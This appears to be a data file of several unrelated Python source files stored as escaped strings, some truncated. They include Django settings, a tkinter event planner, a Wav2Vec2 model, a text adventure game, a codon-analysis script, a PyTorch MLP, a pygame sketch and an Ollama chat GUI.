    "\"\"\"\nDjango settings for principal project.\n\nGenerated by 'django-admin startproject' using Django 4.1.7.\n\nFor more information on this file, see\nhttps://docs.djangoproject.com/en/4.1/topics/settings/\n\nFor the full list of settings and their values, see\nhttps://docs.djangoproject.com/en/4.1/ref/settings/\n\"\"\"\n\nfrom pathlib import Path\n\n# Build paths inside the project like this: BASE_DIR / 'subdir'.\nBASE_DIR = Path(__file__).resolve().parent.parent\n\n\n# Quick-start development settings - unsuitable for production\n# See https://docs.djangoproject.com/en/4.1/howto/deployment/checklist/\n\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = 'django-insecure-e3p9y3i(y%1vc1^q!87d8=ifju+26qr!bs#6v0et)=&-pyk0of'\n\n# SECURITY WARNING: don't run with debug turned on in production!\nDEBUG = True\n\nALLOWED_HOSTS = []\n\n\n# Application definition\n\nINSTALLED_APPS = [\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    'caja_coment'\n]\n\nMIDDLEWARE = [\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n]\n\nROOT_URLCONF = 'principal.urls'\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                'django.template.context_processors.debug',\n                'django.template.context_processors.request',\n                'django.contrib.auth.context_processors.auth',\n                'django.contrib.messages.context_processors.messages',\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = 'principal.wsgi.application'\n\n\n# Database\n# https://docs.djangoproject.com/en/4.1/ref/settings/#databases\n\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3',\n        'NAME': BASE_DIR / 'db.sqlite3',\n    }\n}\n\n\n# Password validation\n# https://docs.djangoproject.com/en/4.1/ref/settings/#auth-password-validators\n\nAUTH_PASSWORD_VALIDATORS = [\n    {\n        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',\n    },\n    {\n        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',\n    },\n]\n\n\n# Internationalization\n# https://docs.djangoproject.com/en/4.1/topics/i18n/\n\nLANGUAGE_CODE = 'en-us'\n\nTIME_ZONE = 'UTC'\n\nUSE_I18N = True\n\nUSE_TZ = True\n\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/4.1/howto/static-files/\n\nSTATIC_URL = 'static/'\n\n# Default primary key field type\n# https://docs.djangoproject.com/en/4.1/ref/settings/#default-auto-field\n\nDEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'\n",
    "import tkinter as tk\r\nfrom tkinter import ttk, messagebox\r\nfrom tkcalendar import Calendar\r\nimport datetime\r\nimport os\r\nimport time\r\nimport base64\r\nfrom email.mime.text import MIMEText\r\nimport threading\r\nfrom google_auth_oauthlib.flow import InstalledAppFlow\r\nfrom google.auth.transport.requests import Request\r\nfrom google.oauth2.credentials import Credentials\r\nfrom google_auth_oauthlib.flow import InstalledAppFlow\r\nfrom googleapiclient.discovery import build\r\nfrom requests import HTTPError\r\nimport os.path\r\nimport json\r\nimport requests\r\nimport sys\r\nimport webbrowser\r\n\r\ndef resource_path(relative_path):\r\n    \"\"\" Get absolute path to resource, works for dev and for PyInstaller \"\"\"\r\n    try:\r\n        # PyInstaller creates a temp folder and stores path in _MEIPASS\r\n        base_path = sys._MEIPASS\r\n    except Exception:\r\n        base_path = os.path.abspath(\".\")\r\n\r\n    return os.path.join(base_path, relative_path)\r\n\r\nclass Event:\r\n    def __init__(self, title, description, date, emails, notify_date = None, sent = False):\r\n        self.title = title\r\n        self.description = description\r\n        self.date = date\r\n        self.emails = emails\r\n        self.notify_date = notify_date  # Add a field to store the date and time of the notification\r\n        self.sent = sent\r\n        \r\n    def serialize(self):\r\n        # Converting the event object to a dictionary\r\n        event_dict = {\r\n            \"title\": self.title,\r\n            \"description\": self.description,\r\n            \"date\": self.date.strftime(\"%Y-%m-%d %H:%M:%S\"),  # Convert date to string\r\n            \"emails\": self.emails,\r\n            \"notify_date\": self.notify_date.strftime(\"%Y-%m-%d %H:%M:%S\") if self.notify_date else None,  # Convert the notification date to a string\r\n            \"sent\": self.sent\r\n        }\r\n        return event_dict\r\n    \r\n    @classmethod\r\n    def deserialize(cls, event_dict):\r\n        # Create an event object from the dictionary\r\n        date = datetime.datetime.strptime(event_dict[\"date\"], \"%Y-%m-%d %H:%M:%S\")\r\n        notify_date = datetime.datetime.strptime(event_dict[\"notify_date\"], \"%Y-%m-%d %H:%M:%S\") if event_dict[\"notify_date\"] else None\r\n        return cls(event_dict[\"title\"], event_dict[\"description\"], date, event_dict[\"emails\"], notify_date, event_dict[\"sent\"])\r\n    \r\n\"\"\"\r\nThis is the official English localization.\r\n\"\"\"\r\n\r\nclass EventPlannerApp:\r\n    def __init__(self, root):\r\n        self.load_fonts()\r\n        self.run_notification_loop()\r\n        \r\n        self.root = root\r\n        self.root.title(\"Event Planner\")\r\n        self.style = ttk.Style()\r\n        self.style.theme_use(\"clam\")\r\n        \r\n        # Bind the event save function to the window close event\r\n        self.root.protocol(\"WM_DELETE_WINDOW\", self.close_application)\r\n        \r\n        # Check if theme file exists\r\n        if os.path.exists(\"current_theme.txt\"):\r\n            with open(\"current_theme.txt\", \"r\") as f:\r\n                self.current_theme = f.read()\r\n        else:\r\n            # Set the default theme if the file does not exist\r\n            self.current_theme = \"light\"\r\n        \r\n        self.style.configure(\"Yellow.TButton\",\r\n                        foreground=\"#323232\",\r\n                        background=\"#FCF7C9\",\r\n                        font=(\"Segoe UI Semibold\", 12),\r\n                        padding=10,\r\n                        )\r\n        self.style.map(\"Yellow.TButton\",\r\n                foreground=[(\"active\", \"white\")],\r\n                background=[(\"active\", \"#323232\")],\r\n                )\r\n\r\n        self.main_frame = tk.Frame(self.root, bg='white')\r\n        self.main_frame.pack(expand=True, fill=\"both\")\r\n        \r\n        self.toolbar_frame = tk.Frame(self.main_frame, bg='white')\r\n        self.toolbar_frame.pack(side=\"top\", fill=\"x\")\r\n\r\n        self.new_event_button = ttk.Button(self.toolbar_frame, text=\"New event\", style=\"Yellow.TButton\", command=self.create_event_window)\r\n        self.new_event_button.pack(side=\"left\")\r\n\r\n        self.settings_button = ttk.Button(self.toolbar_frame, text=\"Settings\", style=\"Yellow.TButton\", command=self.open_settings)\r\n        self.settings_button.pack(side=\"right\")\r\n        \r\n        self.save_button = ttk.Button(self.toolbar_frame, text=\"Save\", style=\"Yellow.TButton\", command=self.save_events_to_file)\r\n        self.save_button.pack(side=\"right\", padx=5)  # Add a small gap between the buttons\r\n        \r\n        ttk.Separator(self.main_frame, orient=\"horizontal\").pack(fill=\"x\")\r\n\r\n        self.paned_window = ttk.PanedWindow(self.main_frame, orient=tk.HORIZONTAL)\r\n        self.paned_window.pack(expand=True, fill=\"both\")\r\n\r\n        self.events_frame = ttk.Frame(self.paned_window)\r\n        self.paned_window.add(self.events_frame, weight=1)\r\n\r\n        self.events_listbox = tk.Listbox(self.events_frame, selectmode=\"single\")\r\n        self.events_listbox.pack(expand=True, fill=\"both\")\r\n\r\n        self.events_listbox.bind(\"<Button-3>\", self.show_context_menu)\r\n        self.events_listbox.bind(\"<<ListboxSelec",
    "# coding=utf-8\n# Copyright 2021 The Fairseq Authors and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\" PyTorch Wav2Vec2 model.\"\"\"\n\nimport math\nimport warnings\nfrom dataclasses import dataclass\nfrom typing import Optional, Tuple, Union\n\nimport numpy as np\nimport torch\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import CrossEntropyLoss\n\nfrom ...activations import ACT2FN\nfrom ...integrations.deepspeed import is_deepspeed_zero3_enabled\nfrom ...modeling_outputs import (\n    BaseModelOutput,\n    CausalLMOutput,\n    MaskedLMOutput,\n    SequenceClassifierOutput,\n    TokenClassifierOutput,\n    Wav2Vec2BaseModelOutput,\n    XVectorOutput,\n)\nfrom ...modeling_utils import PreTrainedModel\nfrom ...pytorch_utils import is_torch_greater_or_equal_than_1_13\nfrom ...utils import (\n    ModelOutput,\n    add_code_sample_docstrings,\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    cached_file,\n    is_peft_available,\n    is_safetensors_available,\n    logging,\n    replace_return_docstrings,\n)\nfrom .configuration_wav2vec2 import Wav2Vec2Config\n\n\nWAV2VEC2_ADAPTER_PT_FILE = \"adapter.{}.bin\"\nWAV2VEC2_ADAPTER_SAFE_FILE = \"adapter.{}.safetensors\"\n\nif is_safetensors_available():\n    from safetensors.torch import load_file as safe_load_file\n\n\nlogger = logging.get_logger(__name__)\n\n\n_HIDDEN_STATES_START_POSITION = 2\n\n# General docstring\n_CONFIG_FOR_DOC = \"Wav2Vec2Config\"\n\n# Base docstring\n_CHECKPOINT_FOR_DOC = \"facebook/wav2vec2-base-960h\"\n_EXPECTED_OUTPUT_SHAPE = [1, 292, 768]\n\n# CTC docstring\n_CTC_EXPECTED_OUTPUT = \"'MISTER QUILTER IS THE APOSTLE OF THE MIDDLE CLASSES AND WE ARE GLAD TO WELCOME HIS GOSPEL'\"\n_CTC_EXPECTED_LOSS = 53.48\n\n# Audio class docstring\n_SEQ_CLASS_CHECKPOINT = \"superb/wav2vec2-base-superb-ks\"\n_SEQ_CLASS_EXPECTED_OUTPUT = \"'_unknown_'\"\n_SEQ_CLASS_EXPECTED_LOSS = 6.54\n\n# Frame class docstring\n_FRAME_CLASS_CHECKPOINT = \"anton-l/wav2vec2-base-superb-sd\"\n_FRAME_EXPECTED_OUTPUT = [0, 0]\n\n# Speaker Verification docstring\n_XVECTOR_CHECKPOINT = \"anton-l/wav2vec2-base-superb-sv\"\n_XVECTOR_EXPECTED_OUTPUT = 0.98\n\n\nWAV_2_VEC_2_PRETRAINED_MODEL_ARCHIVE_LIST = [\n    \"facebook/wav2vec2-base-960h\",\n    \"facebook/wav2vec2-large-960h\",\n    \"facebook/wav2vec2-large-960h-lv60\",\n    \"facebook/wav2vec2-large-960h-lv60-self\",\n    # See all Wav2Vec2 models at https://huggingface.co/models?filter=wav2vec2\n]\n\n\n@dataclass\nclass Wav2Vec2ForPreTrainingOutput(ModelOutput):\n    \"\"\"\n    Output type of [`Wav2Vec2ForPreTraining`], with potential hidden states and attentions.\n\n    Args:\n        loss (*optional*, returned when `sample_negative_indices` are passed, `torch.FloatTensor` of shape `(1,)`):\n            Total loss as the sum of the contrastive loss (L_m) and the diversity loss (L_d) as stated in the [official\n            paper](https://arxiv.org/pdf/2006.11477.pdf) . (classification) loss.\n        projected_states (`torch.FloatTensor` of shape `(batch_size, sequence_length, config.proj_codevector_dim)`):\n            Hidden-states of the model projected to *config.proj_codevector_dim* that can be used to predict the masked\n            projected quantized states.\n        projected_quantized_states (`torch.FloatTensor` of shape `(batch_size, sequence_length, config.proj_codevector_dim)`):\n            Quantized extracted feature vectors projected to *config.proj_codevector_dim* representing the positive\n            target vectors for contrastive loss.\n        hidden_states (`tuple(torch.FloatTensor)`, *optional*, returned when `output_hidden_states=True` is passed or when `config.output_hidden_states=True`):\n            Tuple of `torch.FloatTensor` (one for the output of the embeddings + one for the output of each layer) of\n            shape `(batch_size, sequence_length, hidden_size)`.\n\n            Hidden-states of the model at the output of each layer plus the initial embedding outputs.\n        attentions (`tuple(torch.FloatTensor)`, *optional*, returned when `output_attentions=True` is passed or when `config.output_attentions=True`):\n            Tuple of `torch.FloatTensor` (one for each layer) of shape `(batch_size, num_heads, sequence_length,\n            sequence_length)`.\n\n            Attentions weights after the attention softmax, used to compute the weighted average in the self-attention\n            heads.\n        contrastive_loss (*optional*, returned when `sample_negative_indices` are passed, `torch.FloatTensor` of shape `(1,)`):\n            The contrast",
    "########################################################\n#Imports, music initialization and inventory initialization\n\nimport cv2\nimport pygame\nimport time\nfrom inputimeout import inputimeout, TimeoutOccurred\n\nglobal inventory\ninventory = []\nglobal hiddenInventory\nhiddenInventory = []\nglobal endings\nendings = []\nglobal plasma\nplasma = []\nglobal monsterCounter\nmonsterCounter = 0\nglobal recallChecker\nrecallChecker = 0\nglobal firstTime\nfirstTime = 0\nglobal gameOverCounter\ngameOverCounter = 0\nglobal compassChecker\ncompassChecker = 0\nglobal eleChecker\neleChecker = 0\nglobal scienceChecker\nscienceChecker = 0\n\nimport cred\nimport hintsSystem\n\n#Imports, music initialization and inventory initialization\n########################################################\n\n\n########################################################\n#Intial steup for A Night Among the Trees\n\ndef setupGameMusic():\n    pygame.mixer.init()\n    pygame.mixer.music.load(\"electric-forest-168971.mp3\")\n    pygame.mixer.music.set_volume(0.6)\n    pygame.mixer.music.play(-1)\n    inventory.append(\"employee keycard\")\n    inventory.append(\"factory key\")\n\ndef printTitle():\n    print(\"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\")\n    print(\"     /\\\\                          /\\\\\")\n    print(\"    /  \\\\                        /  \\\\\")\n    print(\"   --  --                      --  --\")\n    print(\"   /    \\\\          A           /    \\\\\")\n    print(\"  /      \\\\       Night        /      \\\\\")\n    print(\"  --    --       Among        --    --\")\n    print(\"  /      \\\\        the         /      \\\\\")\n    print(\" /        \\\\      Tress       /        \\\\\")\n    print(\" ----------                  ----------\")\n    print(\"    |  |                        |  |\")\n    print(\"    |  |                        |  |\")\n    print(\"    |  |                        |  |\")\n    print(\"    |  |                        |  |\")\n    print(\"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\")\n\ndef startGame():\n    global endings\n    global compassChecker\n    global eleChecker\n    global scienceChecker\n    print(\"\\nReady to walk among the trees?\")\n    if len(endings) != 0:\n        print(\"\\n(You can also type 'endings' to see what endings you have found!)\")\n        print(\"\\n(For a game walkthrough, type 'helpme' to access the game walkthrough!)\")\n    if gameOverCounter > 1:\n        print(\"\\n(You can also type 'hint' to get a hint for one of the endings!)\")\n        print(\"\\n(You can also type 'credits' to view the credits!)\")\n    if eleChecker != 0:\n        print(\"\\nYou will now start the game with electricity turned on!\")\n    if compassChecker != 0:\n        print(\"\\nYou can also type 'lostandfound' to start the game with the bus compass!)\")\n    if scienceChecker != 0:\n        print(\"\\nYou can also type 'nightinthelab' to start the game from the research base!\")\n    user_input = input(\"\\nYour answer: \")\n    if user_input.lower() == \"yes\":\n        print(\"The trees await...\")\n        pygame.mixer.music.fadeout(3000)\n        time.sleep(3)\n    elif user_input == \"no\":\n        print(\"Perhaps the wise choice...\")\n        time.sleep(3)\n        print(\"But not any acceptable one.\")\n        time.sleep(3)\n        startGame()\n    elif user_input == \"endings\":\n        endingsFound()\n    elif user_input == \"hint\":\n        hintOffer()\n    elif user_input == \"lostandfound\":\n        inventory.append(\"bus compass\")\n        print(\"The trees await...\")\n        pygame.mixer.music.fadeout(3000)\n        time.sleep(3)\n    elif user_input == \"nightinthelab\":\n        print(\"The trees await...\")\n        pygame.mixer.music.fadeout(3000)\n        time.sleep(3)\n        researchBaseMainRoom()\n    elif user_input == \"helpme\":\n        hintsSystem.qAndA()\n        startGame()\n    elif user_input == \"credits\":\n        pygame.mixer.music.load(\"costalDrive.mp3\")\n        pygame.mixer.music.play(-1)\n        time.sleep(4)\n        print(\"\\nRolling credits...\")\n        time.sleep(5)\n        cred.credits()\n        startGame()\n    else:\n        print(\"The trees do not take kindly to that response...\")\n        startGame()\n\ndef endingsFound():\n    global endings\n    print(\"\\n\\nYou have found the following endings:\\n\")\n    for ending in endings:\n        if ending in endings:\n            if ending == 1:\n                print(\"Ending 1: A Watery Grave\")\n            elif ending == 2:\n                print(\"Ending 2: An Ungrateful Guest\")\n            elif ending == 3:\n                print(\"Ending 3: Too Much of a Good Thing\")\n            elif ending == 4:\n                print(\"Ending 4: The Hunter\")\n            elif ending == 5:\n                print(\"Ending 5: Harvested\")\n            elif ending == 6:\n                print(\"Ending 6: Slip and Fall\")\n            elif ending == 7:\n                print(\"Ending 7: One Day My Bus Will Come\")\n            elif ending == 8:\n                print(\"Ending 8: A Sudden Shock\")\n            elif ending == 9:\n                print(\"Ending 9: The Void\")\n            elif ending == 10:\n                print(\"End",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Wed Feb  8 15:01:23 2023\r\n\r\n@author: Tommy\r\n\"\"\"\r\nimport gzip\r\nfrom glob import glob\r\nimport matplotlib.pyplot as plt\r\nimport os\r\n\r\ndef openfile(filePath):  # openening and reading the fastafile and gfffile\r\n    if filePath.endswith(\".gz\"):\r\n        with gzip.open(filePath, 'rt') as f:\r\n            return [l.strip() for l in f.readlines()]\r\n    else:\r\n        with open(filePath, 'r') as f:\r\n            return [l.strip() for l in f.readlines()]\r\n\r\ndef GcContent(seq):  # calculating the gc content percentage\r\n    return round((seq.count('C') + seq.count('G')) / len(seq) * 100, 6)\r\n\r\ndef parse_fasta(filename):\r\n    FastaFile = openfile(filename)\r\n    FDict = {}\r\n    chromosomeID = \"\"\r\n    nucleotide_sequence = \"\"\r\n    for line in FastaFile:\r\n        line = line.strip()\r\n        if line.startswith(\">\"):\r\n            if chromosomeID != \"\":\r\n                FDict[chromosomeID] = nucleotide_sequence\r\n                nucleotide_sequence = \"\"\r\n            chromosomeID = line.strip().split(' ')[2].split(':')[2]\r\n        else:\r\n            nucleotide_sequence += line\r\n    # adds the last sequence to the dictionary because there isn't a > after the last line\r\n    FDict[chromosomeID] = nucleotide_sequence\r\n    return FDict\r\n\r\ndef parse_gff(gff_file):\r\n    gff_dict = {}\r\n    f = openfile(gff_file)\r\n    for line in f:\r\n        if line.startswith('#'):\r\n            continue\r\n        fields = line.strip().split('\\t')\r\n        if fields[2] == 'gene':\r\n            gene_id = fields[8].split(';')[0]\r\n            start = int(fields[3])\r\n            stop = int(fields[4])\r\n            chromosome = fields[0]\r\n            gff_dict[gene_id] = (start, stop, chromosome) # creates gff dict\r\n    return gff_dict  # Press Ctrl+F8 to toggle the breakpoint.\r\n\r\ndef get_End_Seq(gff_dict, FDict, gene):\r\n    stopRegion = gff_dict[gene][1]          #stop coordinates of gene\r\n    chromosome = gff_dict[gene][2]\r\n    endSeq = (FDict[chromosome][stopRegion + 2:stopRegion + 14])\r\n    return endSeq\r\n\r\ndef get_Initial_StopCodon(gff_dict, FDict, gene):\r\n    stopRegion = gff_dict[gene][1]\r\n    chromosome = gff_dict[gene][2]\r\n    initialStopCodon = (FDict[chromosome][stopRegion - 1:stopRegion+2])# stop codons ????\r\n    return initialStopCodon\r\n\r\ndef get_start_Seq(gff_dict, FDict, gene):\r\n    startRegion = gff_dict[gene][0]\r\n    chromosome = gff_dict[gene][2]\r\n    startSeq = (FDict[chromosome][startRegion - 13:startRegion - 1]) # front end\r\n    return startSeq\r\n\r\ndef get_Initial_StartCodon(gff_dict, FDict, gene):\r\n    startRegion = gff_dict[gene][0]\r\n    chromosome = gff_dict[gene][2]\r\n    initialStartCodon = (FDict[chromosome][startRegion - 1:startRegion + 2]) # start codons ???\r\n    return initialStartCodon\r\n\r\ndef tandemStopCount(endSeq, initialStopCodon, total_stop_codons, total_stop_codons_dict):\r\n    stop_codons = [\"TAA\", \"TAG\", \"TGA\"] # list of possible stop codons\r\n    initialStopCodon_count = 0\r\n    tan_TAA_count = 0\r\n    tan_TAG_count = 0\r\n    tan_TGA_count = 0\r\n    freq = {codon: 0 for codon in stop_codons}\r\n    indexes = {codon: [] for codon in stop_codons}\r\n    for i in range(0, len(endSeq) - 2, 3):  # loops over all stop codons in the endseq\r\n        if len(endSeq) - i >= 3:  # Check if there are at least 3 characters left to form a codon\r\n            codon = endSeq[i:i + 3]\r\n            if codon in stop_codons:\r\n                if (i + 3) % 3 == 0:\r\n                    freq[codon] += 1\r\n                    indexes[codon].append(i)\r\n                    if codon == 'TAA':\r\n                        tan_TAA_count += 1 # iterates to count the condon usage\r\n                    if codon == 'TAG':\r\n                        tan_TAG_count += 1\r\n                    if codon == 'TGA':\r\n                        tan_TGA_count += 1\r\n                total_stop_codons += 1\r\n    if initialStopCodon in stop_codons:\r\n        initialStopCodon_count += 1\r\n        total_stop_codons_dict[initialStopCodon] = (\r\n            total_stop_codons_dict[initialStopCodon][0] + initialStopCodon_count, # returns count to the dict to count frequecy on multiple genes\r\n            total_stop_codons_dict[initialStopCodon][1] + tan_TAA_count,\r\n            total_stop_codons_dict[initialStopCodon][2] + tan_TAG_count,\r\n            total_stop_codons_dict[initialStopCodon][3] + tan_TGA_count\r\n        )\r\n    tandemStopCountData = [freq, indexes, total_stop_codons, total_stop_codons_dict]\r\n    return tandemStopCountData\r\n\r\ndef tandemStartCount(startSeq, initialStartCodon, total_start_codons, total_start_codons_dict):\r\n    start_codons = [\"ATG\", \"GTG\", \"TTG\"] # list of possible start codons\r\n    initialStartCodon_count = 0\r\n    tan_ATG_count = 0\r\n    tan_GTG_count = 0\r\n    tan_TTG_count = 0\r\n    freq = {codon: 0 for codon in start_codons}\r\n    indexes = {codon: [] for codon in start_codons}\r\n    for i in range(0, len(startSeq) - 2, 3):  # loops over all stop codons in the startseq\r\n        codon = startSeq[i:i + 3]\r\n        if codon in start_codons:\r\n    ",
    "import torch\r\nimport torch.nn as nn\r\n\r\nclass MLP(nn.Module):\r\n    def __init__(self, input_size = 28*28, hidden_dim = 100, depth = 1, num_classes = 10, drop_out = 0.):\r\n        super(MLP, self).__init__()\r\n        self.input_layer = nn.Linear(input_size, hidden_dim)\r\n        self.relu = nn.ReLU()\r\n        self.hidden_layers = nn.Sequential(*[nn.Sequential(nn.Linear(hidden_dim, hidden_dim), nn.ReLU(), nn.Dropout(drop_out)) for _ in range(depth-1)])\r\n        self.fc = nn.Linear(hidden_dim, num_classes)\r\n\r\n    def forward(self, x):\r\n        x = x.view(x.shape[0],-1)\r\n        x = self.relu(self.input_layer(x))\r\n        x = self.hidden_layers(x)\r\n        return self.fc(x)\r\n\r\nif __name__ == \"__main__\":\r\n    _input = torch.rand(32,1,28,28)\r\n    model = MLP(input_size = 28*28, hidden_dim = 100, depth = 1, num_classes = 10, drop_out = 0.)\r\n    print(model)\r\n    print(model(_input).shape)\r\n    from thop import profile\r\n    flops, params = profile(model, inputs=(_input,))\r\n    print(f'Model parameters: {params / 1e6:.2f}M')\r\n    print(f'FLOPs: {flops / 1e9:.2f}G')",
    "import requests\n\ndef get_video_info(video_url):\n    api_url = f\"https://youtubedownloader-api.onrender.com/youtube-video/?url={video_url}\"\n    response = requests.get(api_url)\n    \n    if response.status_code == 200:\n        data = response.json()\n        video_info = data['response']\n        return video_info\n    else:\n        return None\n\ndef main():\n    video_url = input(\"\u6700\u521d\u306b\u52d5\u753b\u306eURL\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044: \")\n    video_info = get_video_info(video_url)\n    \n    if video_info:\n        print(\"\u52d5\u753b\u60c5\u5831:\")\n        print(f\"\u30bf\u30a4\u30c8\u30eb: {video_info['title']}\")\n        print(f\"\u8aac\u660e: {video_info['description']}\")\n        print(f\"\u8996\u8074\u56de\u6570: {video_info['viewCount']}\")\n        print(f\"\u30ab\u30c6\u30b4\u30ea: {video_info['category']}\")\n        print(f\"\u516c\u958b\u65e5: {video_info['publishDate']}\")\n        print(f\"\u30c1\u30e3\u30f3\u30cd\u30eb\u540d: {video_info['channelName']}\")\n        print(f\"\u30c1\u30e3\u30f3\u30cd\u30eb\u767b\u9332\u8005\u6570: {video_info['subscriberCount']}\")\n        print(\"\u52d5\u753bURL:\")\n        for video in video_info['videos']:\n            if video['hasAudio']:\n                print(video['url'])\n    else:\n        print(\"\u52d5\u753b\u60c5\u5831\u3092\u53d6\u5f97\u3067\u304d\u307e\u305b\u3093\u3067\u3057\u305f\u3002\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "import pygame\n\n# Initialize pygame\npygame.init()\n\n# Set up the game window\nscreen_width = 1900\nscreen_height = 1024\nscreen = pygame.display.set_mode((screen_width, screen_height))\npygame.display.set_caption(\"TMNT Game\")\n\n# Load images\nbackground_image = pygame.image.load(\"background.gif\")\nturtle_image = pygame.image.load(\"turtle.png\")\nshredder_image = pygame.image.load(\"shredder.webp\")\nbebop_image = pygame.image.load(\"bebop.webp\")\nrocksteady_image = pygame.image.load(\"rocksteady.webp\")\n\n# Set initial positions\nturtle_x = 100\nturtle_y = 300\nshredder_x = 600\nshredder_y = 300\nbebop_x = 400\nbebop_y = 200\nrocksteady_x = 400\nrocksteady_y = 400\n\n# Game loop\nrunning = True\nwhile running:\n  # Handle events\n  for event in pygame.event.get():\n    if event.type == pygame.QUIT:\n      running = False\n\n  # Update game logic\n\n  # Draw background\n  screen.blit(background_image, (0, 0))\n\n  # Draw characters\n  screen.blit(turtle_image, (turtle_x, turtle_y))\n  screen.blit(shredder_image, (shredder_x, shredder_y))\n  screen.blit(bebop_image, (bebop_x, bebop_y))\n  screen.blit(rocksteady_image, (rocksteady_x, rocksteady_y))\n\n  # Update display\n  pygame.display.flip()\n\n# Quit the game\npygame.quit()",
    "from tkinter import *\nfrom PIL import ImageTk, Image\nfrom tkinter import scrolledtext, messagebox\nimport ollama\nfrom datetime import datetime\n\n\n\n##########################################################\n# Reading the configuration\n##########################################################e\nwith open('config.txt', 'r') as file:\n    lines = file.readlines()\n\nconfig = {}\n\nfor line in lines:\n\n    key, value = line.strip().split('=')\n    \n\n    key = key.strip()\n    value = value.strip()\n    \n    config[key] = value\n\nif config['debug'] == 'true':\n    print(config)\n\n##########################################################\n# Defining All the functions\n##########################################################\ndef save_conversation():\n    conversation = chat_display.get(\"1.0\", END)\n    with open(f\"conversations/conversation{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt\", \"w\") as file:\n        file.write(conversation)\n    messagebox.showinfo(\"Save Conversation\", \"Conversation saved successfully.\")\n\n\ndef clear_conversation():\n    chat_display.configure(state='normal')\n    chat_display.delete('1.0', END)\n    chat_display.configure(state='disabled')\n\n\n\ndef send_message(event=None):\n    message = entry.get()\n    if message:\n        entry.delete(0, END)\n        \n        response = get_response(message)        \n        chat_display.configure(state='normal')  \n        chat_display.insert(END, \"You: \" + message + \"\\n\")\n        chat_display.insert(END, f\"{config['name']}: \" + response + \"\\n\")\n        chat_display.configure(state='disabled')  \n\ndef get_response(message):\n    try:\n        response = ollama.chat(model=config['model'], messages=[{'role': 'user', 'content': message}])\n        return response['message']['content']\n    except Exception as e:\n        print(\"Error:\", e)\n        return \"Error: Failed to get response from model\"\n\n##########################################################\n# Everything that has to do with the GUI\n##########################################################\nroot = Tk()\nroot.title(config['title'])\n\n\n# Menu Bar\nmenubar = Menu(root)\nroot.config(menu=menubar)\n\nfile_menu = Menu(menubar, tearoff=False)\n\nfile_menu.add_command(\n    label='Save Conversation',\n    command=save_conversation\n)\n\nfile_menu.add_command(\n    label='Clear Conversation',\n    command=clear_conversation\n)\n\nfile_menu.add_command(\n    label='Exit',\n    command=root.destroy\n)\n\n\nmenubar.add_cascade(\n    label=\"File\",\n    menu=file_menu\n)\n\n# loading the image\nif config['image'] == 'true':\n    img = ImageTk.PhotoImage(Image.open(f\"images/{config['imagePath']}.png\"))\n    panel = Label(root, image=img)\n    panel.pack(side=\"left\", fill=\"both\", expand=\"no\")\n\n# Inital Message\ninitial_message = f\"\\n---------- DEBUG ----------\\nConnected To Ollama Server.\\nRunning Version {config['version']}. Model: {config['model']}\"\nchat_display = scrolledtext.ScrolledText(root, wrap=WORD, width=40, height=15, state='normal')\nif config['debug']:\n    chat_display.insert(END, \"Programm: \" + initial_message + \"\\n\")\nchat_display.configure(state='disabled')  \nchat_display.pack(padx=10, pady=10)\n\n# user input\nentry = Entry(root, width=40)\nentry.pack(pady=5)\n\n\n# send button\nsend_button = Button(root, text=\"Send\", command=send_message)\nsend_button.pack(pady=5)\n\n\n# Bind the Enter key to the send_message function\nentry.bind(\"<Return>\", send_message)\n\n# Run the Tkinter event loop\nroot.mainloop()\n",
